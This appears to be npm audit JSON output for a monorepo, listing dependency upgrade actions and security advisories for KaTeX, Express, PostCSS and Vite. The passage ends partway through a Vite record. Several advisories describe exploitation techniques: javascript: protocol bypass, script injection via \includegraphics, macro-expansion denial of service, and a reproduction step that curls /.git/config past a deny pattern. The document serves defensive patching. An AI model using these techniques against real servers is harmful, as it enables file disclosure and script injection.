{
  "actions": [
    {
      "action": "update",
      "resolves": [
        {
          "id": 1096808,
          "path": "packages__ui>remark-math>micromark-extension-math>katex",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1096809,
          "path": "packages__ui>remark-math>micromark-extension-math>katex",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1096810,
          "path": "packages__ui>remark-math>micromark-extension-math>katex",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1096811,
          "path": "packages__ui>remark-math>micromark-extension-math>katex",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107419,
          "path": "packages__ui>remark-math>micromark-extension-math>katex",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "katex",
      "target": "0.16.25",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1097200,
          "path": "packages__components>@elastic/elasticsearch>@elastic/transport>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1101610,
          "path": "packages__components>@elastic/elasticsearch>@elastic/transport>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1102442,
          "path": "packages__components>@elastic/elasticsearch>@elastic/transport>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104501,
          "path": "packages__components>@elastic/elasticsearch>@elastic/transport>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "undici",
      "target": "5.29.0",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1097493,
          "path": ".>eslint-config-react-app>eslint-plugin-jest>jest>@jest/core>jest-config>jest-environment-jsdom>jsdom>canvas>@mapbox/node-pre-gyp>tar",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "tar",
      "target": "6.2.1",
      "depth": 11
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1098725,
          "path": "packages__components>@stripe/agent-toolkit>ai>svelte",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1101163,
          "path": "packages__components>@stripe/agent-toolkit>ai>nanoid",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1108189,
          "path": "packages__components>@stripe/agent-toolkit>ai>jsondiffpatch",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1109208,
          "path": "packages__components>@langchain/community>@browserbasehq/stagehand>@playwright/test>playwright",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": null,
      "target": null,
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1099351,
          "path": "packages__ui>react-scripts>webpack",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "webpack",
      "target": "5.102.1",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1101164,
          "path": "packages__components>langwatch>nanoid",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "nanoid",
      "target": "5.1.6",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1104000,
          "path": "packages__ui>@testing-library/jest-dom>@babel/runtime",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "@babel/runtime",
      "target": "7.28.4",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1104001,
          "path": ".>@babel/preset-env>@babel/core>@babel/helpers",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "@babel/helpers",
      "target": "7.28.4",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1105444,
          "path": ".>@typescript-eslint/typescript-estree>minimatch>brace-expansion",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "brace-expansion",
      "target": "2.0.2",
      "depth": 4
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1105770,
          "path": "packages__ui>react-syntax-highlighter>prismjs",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "prismjs",
      "target": "1.30.0",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1106849,
          "path": "packages__server>cypress>tmp",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "tmp",
      "target": "0.2.5",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1106849,
          "path": "packages__server>oclif>@oclif/plugin-not-found>@inquirer/prompts>@inquirer/editor>external-editor>tmp",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "@oclif/plugin-not-found",
      "target": "3.2.71",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1107537,
          "path": "packages__components>typeorm>sha.js",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "sha.js",
      "target": "2.4.12",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1109073,
          "path": "packages__components>llamaindex>mammoth",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "mammoth",
      "target": "1.11.0",
      "depth": 3
    },
    {
      "action": "update",
      "resolves": [
        {
          "id": 1109241,
          "path": "packages__api-documentation>swagger-jsdoc>swagger-parser>@apidevtools/swagger-parser>z-schema>validator",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ],
      "module": "validator",
      "target": "13.15.20",
      "depth": 6
    },
    {
      "action": "review",
      "module": "postcss",
      "resolves": [
        {
          "id": 1094544,
          "path": "packages__ui>react-scripts>resolve-url-loader>postcss",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "express",
      "resolves": [
        {
          "id": 1096820,
          "path": "packages__components>express",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1100530,
          "path": "packages__components>express",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "vite",
      "resolves": [
        {
          "id": 1096893,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1096895,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1099687,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1099689,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1099694,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1099696,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1102436,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1102437,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103516,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103517,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103627,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103628,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103883,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103884,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104172,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104173,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104201,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104202,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107323,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107323,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107327,
          "path": "packages__ui>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1107327,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "micromatch",
      "resolves": [
        {
          "id": 1098681,
          "path": ".>lint-staged>micromatch",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1098681,
          "path": "packages__components>gulp>glob-watcher>anymatch>micromatch",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "send",
      "resolves": [
        {
          "id": 1100526,
          "path": "packages__components>express>send",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "serve-static",
      "resolves": [
        {
          "id": 1100528,
          "path": "packages__components>express>serve-static",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "nanoid",
      "resolves": [
        {
          "id": 1101163,
          "path": "packages__server>nanoid",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "undici",
      "resolves": [
        {
          "id": 1101610,
          "path": "packages__components>@qdrant/js-client-rest>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104501,
          "path": "packages__components>@qdrant/js-client-rest>undici",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "esbuild",
      "resolves": [
        {
          "id": 1102341,
          "path": "packages__ui>vite>esbuild",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1102341,
          "path": "packages__ui>flowise-embed-react>@ladle/react>vite>esbuild",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "cookie",
      "resolves": [
        {
          "id": 1103907,
          "path": "packages__components>express>cookie",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1103907,
          "path": "packages__server>cookie-parser>cookie",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "http-proxy-middleware",
      "resolves": [
        {
          "id": 1104109,
          "path": "packages__ui>react-scripts>webpack-dev-server>http-proxy-middleware",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1104110,
          "path": "packages__ui>react-scripts>webpack-dev-server>http-proxy-middleware",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "brace-expansion",
      "resolves": [
        {
          "id": 1105443,
          "path": ".>eslint>minimatch>brace-expansion",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "on-headers",
      "resolves": [
        {
          "id": 1106812,
          "path": "packages__server>express-session>on-headers",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "tar-fs",
      "resolves": [
        {
          "id": 1108378,
          "path": "packages__components>faiss-node>prebuild-install>tar-fs",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "webpack-dev-server",
      "resolves": [
        {
          "id": 1108429,
          "path": "packages__ui>react-scripts>webpack-dev-server",
          "dev": false,
          "optional": false,
          "bundled": false
        },
        {
          "id": 1108430,
          "path": "packages__ui>react-scripts>webpack-dev-server",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "nodemailer",
      "resolves": [
        {
          "id": 1108571,
          "path": "packages__server>nodemailer",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "mammoth",
      "resolves": [
        {
          "id": 1109073,
          "path": "packages__components>mammoth",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    },
    {
      "action": "review",
      "module": "playwright",
      "resolves": [
        {
          "id": 1109208,
          "path": "packages__components>playwright",
          "dev": false,
          "optional": false,
          "bundled": false
        }
      ]
    }
  ],
  "advisories": {
    "1094544": {
      "findings": [
        {
          "version": "7.0.39",
          "paths": [
            "packages__ui>react-scripts>resolve-url-loader>postcss"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2023-44270\n- https://github.com/postcss/postcss/commit/58cc860b4c1707510c9cd1bc1fa30b423a9ad6c5\n- https://github.com/postcss/postcss/blob/main/lib/tokenize.js#L25\n- https://github.com/postcss/postcss/releases/tag/8.4.31\n- https://github.com/github/advisory-database/issues/2820\n- https://github.com/advisories/GHSA-7fh5-64p2-3v2j",
      "created": "2023-09-30T00:31:10.000Z",
      "id": 1094544,
      "npm_advisory_id": null,
      "overview": "An issue was discovered in PostCSS before 8.4.31. It affects linters using PostCSS to parse external Cascading Style Sheets (CSS). There may be `\\r` discrepancies, as demonstrated by `@font-face{ font:(\\r/*);}` in a rule.\n\nThis vulnerability affects linters using PostCSS to parse external untrusted CSS. An attacker can prepare CSS in such a way that it will contains parts parsed by PostCSS as a CSS comment. After processing by PostCSS, it will be included in the PostCSS output in CSS nodes (rules, properties) despite being originally included in a comment.",
      "reported_by": null,
      "title": "PostCSS line return parsing error",
      "metadata": null,
      "cves": [
        "CVE-2023-44270"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "postcss",
      "vulnerable_versions": "<8.4.31",
      "github_advisory_id": "GHSA-7fh5-64p2-3v2j",
      "recommendation": "Upgrade to version 8.4.31 or later",
      "patched_versions": ">=8.4.31",
      "updated": "2023-11-05T05:05:37.000Z",
      "cvss": {
        "score": 5.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
      },
      "cwe": [
        "CWE-74",
        "CWE-144"
      ],
      "url": "https://github.com/advisories/GHSA-7fh5-64p2-3v2j"
    },
    "1096808": {
      "findings": [
        {
          "version": "0.16.9",
          "paths": [
            "packages__ui>remark-math>micromark-extension-math>katex"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-3wc5-fcw2-2329\n- https://github.com/KaTeX/KaTeX/commit/fc5af64183a3ceb9be9d1c23a275999a728593de\n- https://nvd.nist.gov/vuln/detail/CVE-2024-28246\n- https://github.com/advisories/GHSA-3wc5-fcw2-2329",
      "created": "2024-03-25T19:38:37.000Z",
      "id": 1096808,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nCode that uses KaTeX's `trust` option, specifically that provides a function to block-list certain URL protocols, can be fooled by URLs in malicious inputs that use uppercase characters in the protocol. In particular, this can allow for malicious input to generate `javascript:` links in the output, even if the `trust` function tries to forbid this protocol via `trust: (context) => context.protocol !== 'javascript'`.\n\n### Patches\nUpgrade to KaTeX v0.16.10 to remove this vulnerability.\n\n### Workarounds\n* Allow-list instead of block protocols in your `trust` function.\n* Manually lowercase `context.protocol` via `context.protocol.toLowerCase()` before attempting to check for certain protocols.\n* Avoid use of or turn off the `trust` option.\n\n\n### Details\nKaTeX did not normalize the `protocol` entry of the `context` object provided to a user-specified `trust`-function, so it could be a mix of lowercase and/or uppercase letters.\n\nIt is generally better to allow-list by protocol, in which case this would normally not be an issue. But in some cases, you might want to block-list, and the [KaTeX documentation](https://katex.org/docs/options.html) even provides such an example:\n\n> Allow all commands but forbid specific protocol: `trust: (context) => context.protocol !== 'file'`\n\nCurrently KaTeX internally sees `file:` and `File:` URLs as different protocols, so `context.protocol` can be `file` or `File`, so the above check does not suffice.  A simple workaround would be:\n\n> `trust: (context) => context.protocol.toLowerCase() !== 'file'`\n\nMost URL parsers normalize the scheme to lowercase. For example, [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#section-3.1) says:\n\n> Although schemes are case-insensitive, the canonical form is lowercase and documents that specify schemes must do so with lowercase letters. An implementation should accept uppercase letters as equivalent to lowercase in scheme names (e.g., allow \"HTTP\" as well as \"http\") for the sake of robustness but should only produce lowercase scheme names for consistency.\n",
      "reported_by": null,
      "title": "KaTeX missing normalization of the protocol in URLs allows bypassing forbidden protocols",
      "metadata": null,
      "cves": [
        "CVE-2024-28246"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "katex",
      "vulnerable_versions": ">=0.11.0 <0.16.10",
      "github_advisory_id": "GHSA-3wc5-fcw2-2329",
      "recommendation": "Upgrade to version 0.16.10 or later",
      "patched_versions": ">=0.16.10",
      "updated": "2024-03-25T22:32:12.000Z",
      "cvss": {
        "score": 5.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-184"
      ],
      "url": "https://github.com/advisories/GHSA-3wc5-fcw2-2329"
    },
    "1096809": {
      "findings": [
        {
          "version": "0.16.9",
          "paths": [
            "packages__ui>remark-math>micromark-extension-math>katex"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-f98w-7cxr-ff2h\n- https://github.com/KaTeX/KaTeX/commit/c5897fcd1f73da9612a53e6b5544f1d776e17770\n- https://nvd.nist.gov/vuln/detail/CVE-2024-28245\n- https://github.com/advisories/GHSA-f98w-7cxr-ff2h",
      "created": "2024-03-25T19:38:34.000Z",
      "id": 1096809,
      "npm_advisory_id": null,
      "overview": "### Impact\nKaTeX users who render untrusted mathematical expressions could encounter malicious input using `\\includegraphics` that runs arbitrary JavaScript, or generate invalid HTML.\n\n### Patches\nUpgrade to KaTeX v0.16.10 to remove this vulnerability.\n\n### Workarounds\n* Avoid use of or turn off the `trust` option, or set it to forbid `\\includegraphics` commands.\n* Forbid inputs containing the substring `\"\\\\includegraphics\"`.\n* Sanitize HTML output from KaTeX.\n\n### Details\n`\\includegraphics` did not properly quote its filename argument, allowing it to generate invalid or malicious HTML that runs scripts.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n* Email us at katex-security@mit.edu",
      "reported_by": null,
      "title": "KaTeX's `\\includegraphics` does not escape filename",
      "metadata": null,
      "cves": [
        "CVE-2024-28245"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "katex",
      "vulnerable_versions": ">=0.11.0 <0.16.10",
      "github_advisory_id": "GHSA-f98w-7cxr-ff2h",
      "recommendation": "Upgrade to version 0.16.10 or later",
      "patched_versions": ">=0.16.10",
      "updated": "2024-03-25T22:32:07.000Z",
      "cvss": {
        "score": 6.3,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"
      },
      "cwe": [
        "CWE-116"
      ],
      "url": "https://github.com/advisories/GHSA-f98w-7cxr-ff2h"
    },
    "1096810": {
      "findings": [
        {
          "version": "0.16.9",
          "paths": [
            "packages__ui>remark-math>micromark-extension-math>katex"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cvr6-37gx-v8wc\n- https://github.com/KaTeX/KaTeX/commit/085e21b5da05414efefa932570e7201a7c70e5b2\n- https://nvd.nist.gov/vuln/detail/CVE-2024-28244\n- https://github.com/advisories/GHSA-cvr6-37gx-v8wc",
      "created": "2024-03-25T19:38:29.000Z",
      "id": 1096810,
      "npm_advisory_id": null,
      "overview": "### Impact\nKaTeX users who render untrusted mathematical expressions could encounter malicious input using `\\def` or `\\newcommand` that causes a near-infinite loop, despite setting `maxExpand` to avoid such loops. This can be used as an availability attack, where e.g. a client rendering another user's KaTeX input will be unable to use the site due to memory overflow, tying up the main thread, or stack overflow.\n\n### Patches\nUpgrade to KaTeX v0.16.10 to remove this vulnerability.\n\n### Workarounds\nForbid inputs containing any of the characters `ÔéèÔéïÔéîÔéìÔéÄÔéÇÔéüÔééÔéâÔéäÔéàÔéåÔéçÔéêÔéëÔéÉÔéæÔéòßÁóÔ▒╝ÔéûÔéùÔéÿÔéÖÔéÆÔéÜßÁúÔéøÔé£ßÁñßÁÑÔéôßÁªßÁºßÁ¿ßÁ®ßÁ¬Ôü║Ôü╗Ôü╝Ôü¢Ôü¥Ôü░┬╣┬▓┬│Ôü┤ÔüÁÔüÂÔüÀÔü©Ôü╣ßÁâßÁçßÂ£ßÁêßÁëßÁì╩░Ôü▒╩▓ßÁÅ╦íßÁÉÔü┐ßÁÆßÁû╩│╦óßÁùßÁÿ╩À╦ú╩©ßÂ╗ßÁøßÁØßÁ×ßÁƒßÁáßÁí` before passing them to KaTeX.\n(There is no easy workaround for the auto-render extension.)\n\n### Details\nKaTeX supports an option named `maxExpand` which aims to prevent infinitely recursive macros from consuming all available memory and/or triggering a stack overflow error. Unfortunately, [support for \"Unicode (sub|super)script characters\"](https://github.com/KaTeX/KaTeX/commit/d8fc35e6a97f8e561c723b93ad275cf5a7f3094a) allows an attacker to bypass this limit. Each sub/superscript group instantiated a separate Parser with its own limit on macro executions, without inheriting the current count of macro executions from its parent. This has been corrected in KaTeX v0.16.10.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n* Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
      "reported_by": null,
      "title": "KaTeX's maxExpand bypassed by Unicode sub/superscripts",
      "metadata": null,
      "cves": [
        "CVE-2024-28244"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "katex",
      "vulnerable_versions": ">=0.15.4 <0.16.10",
      "github_advisory_id": "GHSA-cvr6-37gx-v8wc",
      "recommendation": "Upgrade to version 0.16.10 or later",
      "patched_versions": ">=0.16.10",
      "updated": "2024-03-25T22:32:02.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-606",
        "CWE-674"
      ],
      "url": "https://github.com/advisories/GHSA-cvr6-37gx-v8wc"
    },
    "1096811": {
      "findings": [
        {
          "version": "0.16.9",
          "paths": [
            "packages__ui>remark-math>micromark-extension-math>katex"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/KaTeX/KaTeX/security/advisories/GHSA-64fm-8hw2-v72w\n- https://github.com/KaTeX/KaTeX/commit/e88b4c357f978b1bca8edfe3297f0aa309bcbe34\n- https://nvd.nist.gov/vuln/detail/CVE-2024-28243\n- https://github.com/advisories/GHSA-64fm-8hw2-v72w",
      "created": "2024-03-25T19:38:18.000Z",
      "id": 1096811,
      "npm_advisory_id": null,
      "overview": "### Impact\nKaTeX users who render untrusted mathematical expressions could encounter malicious input using `\\edef` that causes a near-infinite loop, despite setting `maxExpand` to avoid such loops. This can be used as an availability attack, where e.g. a client rendering another user's KaTeX input will be unable to use the site due to memory overflow, tying up the main thread, or stack overflow.\n\n### Patches\nUpgrade to KaTeX v0.16.10 to remove this vulnerability.\n\n### Workarounds\nForbid inputs containing the substring `\"\\\\edef\"` before passing them to KaTeX.\n(There is no easy workaround for the auto-render extension.)\n\n### Details\nKaTeX supports an option named `maxExpand` which prevents infinitely recursive macros from consuming all available memory and/or triggering a stack overflow error. However, what counted as an \"expansion\" is a single macro expanding to any number of tokens. The expand-and-define TeX command `\\edef` can be used to build up an exponential number of tokens using only a linear number of expansions according to this definition, e.g. by repeatedly doubling the previous definition. This has been corrected in KaTeX v0.16.10, where every expanded token in an `\\edef` counts as an expansion.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue or security advisory in the [KaTeX repository](https://github.com/KaTeX/KaTeX/)\n* Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)",
      "reported_by": null,
      "title": "KaTeX's maxExpand bypassed by `\\edef`",
      "metadata": null,
      "cves": [
        "CVE-2024-28243"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "katex",
      "vulnerable_versions": ">=0.10.0-beta <0.16.10",
      "github_advisory_id": "GHSA-64fm-8hw2-v72w",
      "recommendation": "Upgrade to version 0.16.10 or later",
      "patched_versions": ">=0.16.10",
      "updated": "2024-03-25T22:31:57.000Z",
      "cvss": {
        "score": 6.5,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
      },
      "cwe": [
        "CWE-606",
        "CWE-674"
      ],
      "url": "https://github.com/advisories/GHSA-64fm-8hw2-v72w"
    },
    "1096820": {
      "findings": [
        {
          "version": "4.18.3",
          "paths": [
            "packages__components>express"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/expressjs/express/security/advisories/GHSA-rv95-896h-c2vc\n- https://github.com/koajs/koa/issues/1800\n- https://github.com/expressjs/express/pull/5539\n- https://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\n- https://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n- https://expressjs.com/en/4x/api.html#res.location\n- https://nvd.nist.gov/vuln/detail/CVE-2024-29041\n- https://github.com/advisories/GHSA-rv95-896h-c2vc",
      "created": "2024-03-25T19:40:26.000Z",
      "id": 1096820,
      "npm_advisory_id": null,
      "overview": "### Impact\n\nVersions of Express.js prior to 4.19.2 and pre-release alpha and beta versions before 5.0.0-beta.3 are affected by an open redirect vulnerability using malformed URLs.\n\nWhen a user of Express performs a redirect using a user-provided URL Express performs an encode [using `encodeurl`](https://github.com/pillarjs/encodeurl) on the contents before passing it to the `location` header. This can cause malformed URLs to be evaluated in unexpected ways by common redirect allow list implementations in Express applications, leading to an Open Redirect via bypass of a properly implemented allow list.\n\nThe main method impacted is `res.location()` but this is also called from within `res.redirect()`.\n\n### Patches\n\nhttps://github.com/expressjs/express/commit/0867302ddbde0e9463d0564fea5861feb708c2dd\nhttps://github.com/expressjs/express/commit/0b746953c4bd8e377123527db11f9cd866e39f94\n\nAn initial fix went out with `express@4.19.0`, we then patched a feature regression in `4.19.1` and added improved handling for the bypass in `4.19.2`.\n\n### Workarounds\n\nThe fix for this involves pre-parsing the url string with either `require('node:url').parse` or `new URL`. These are steps you can take on your own before passing the user input string to `res.location` or `res.redirect`.\n\n### References\n\nhttps://github.com/expressjs/express/pull/5539\nhttps://github.com/koajs/koa/issues/1800\nhttps://expressjs.com/en/4x/api.html#res.location",
      "reported_by": null,
      "title": "Express.js Open Redirect in malformed URLs",
      "metadata": null,
      "cves": [
        "CVE-2024-29041"
      ],
      "access": "public",
      "severity": "moderate",
      "module_name": "express",
      "vulnerable_versions": "<4.19.2",
      "github_advisory_id": "GHSA-rv95-896h-c2vc",
      "recommendation": "Upgrade to version 4.19.2 or later",
      "patched_versions": ">=4.19.2",
      "updated": "2024-03-27T21:47:29.000Z",
      "cvss": {
        "score": 6.1,
        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"
      },
      "cwe": [
        "CWE-601",
        "CWE-1286"
      ],
      "url": "https://github.com/advisories/GHSA-rv95-896h-c2vc"
    },
    "1096893": {
      "findings": [
        {
          "version": "5.1.6",
          "paths": [
            "packages__ui>vite"
          ]
        }
      ],
      "found_by": null,
      "deleted": null,
      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-8jhw-289h-jh2g\n- https://github.com/vitejs/vite/commit/011bbca350e447d1b499d242804ce62738c12bc0\n- https://github.com/vitejs/vite/commit/5a056dd2fc80dbafed033062fe6aaf4717309f48\n- https://github.com/vitejs/vite/commit/89c7c645f09d16a38f146ef4a1528f218e844d67\n- https://github.com/vitejs/vite/commit/96a7f3a41ef2f9351c46f3ab12489bb4efa03cc9\n- https://github.com/vitejs/vite/commit/ba5269cca81de3f5fbb0f49d58a1c55688043258\n- https://github.com/vitejs/vite/commit/d2db33f7d4b96750b35370c70dd2c35ec3b9b649\n- https://nvd.nist.gov/vuln/detail/CVE-2024-31207\n- https://github.com/advisories/GHSA-8jhw-289h-jh2g",
      "created": "2024-04-03T16:46:17.000Z",
      "id": 1096893,
      "npm_advisory_id": null,
      "overview": "### Summary\n[Vite dev server option](https://vitejs.dev/config/server-options.html#server-fs-deny) `server.fs.deny` did not deny requests for patterns with directories. An example of such a pattern is `/foo/**/*`.\n\n### Impact\nOnly apps setting a custom `server.fs.deny` that includes a pattern with directories, and explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected.\n\n### Patches\nFixed in vite@5.2.6, vite@5.1.7, vite@5.0.13, vite@4.5.3, vite@3.2.10, vite@2.9.18\n\n### Details\n`server.fs.deny` uses picomatch with the config of `{ matchBase: true }`. [matchBase](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=Description-,basename,-boolean) only matches the basename of the file, not the path due to a bug (https://github.com/micromatch/picomatch/issues/89). The vite config docs read like you should be able to set fs.deny to glob with picomatch. Vite also does not set `{ dot: true }` and that causes [dotfiles not to be denied](https://github.com/micromatch/picomatch/blob/master/README.md#options:~:text=error%20is%20thrown.-,dot,-boolean) unless they are explicitly defined.\n\n**Reproduction**\n\nSet fs.deny to `['**/.git/**']` and then curl for `/.git/config`.\n\n* with `matchBase: true`, you can get any file under  `.git/` (config, HEAD, etc).\n* with `matchBase: false`, you cannot get any file under  `.git/` (config, HEAD, etc).\n",
      "reported_by": null,
